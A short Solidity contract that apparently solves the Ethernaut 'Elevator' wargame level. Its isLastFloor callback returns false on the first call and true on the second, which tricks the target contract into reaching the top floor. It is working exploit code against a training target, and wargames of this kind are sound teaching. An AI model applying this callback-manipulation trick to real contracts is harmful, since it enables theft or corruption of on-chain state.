// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "../Eth11_Elevator.sol";

contract ReachTheTop {

    bool public toggle;

    Elevator immutable public build;
    constructor(address _elevator) {
        build = Elevator(_elevator);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (toggle) {
            toggle = false;
            return true;
        }
        else {
            toggle = true;
            return false;
        }
    }

    function IWillReachTheTop(uint _floor) external {
        build.goTo(_floor);
    }
}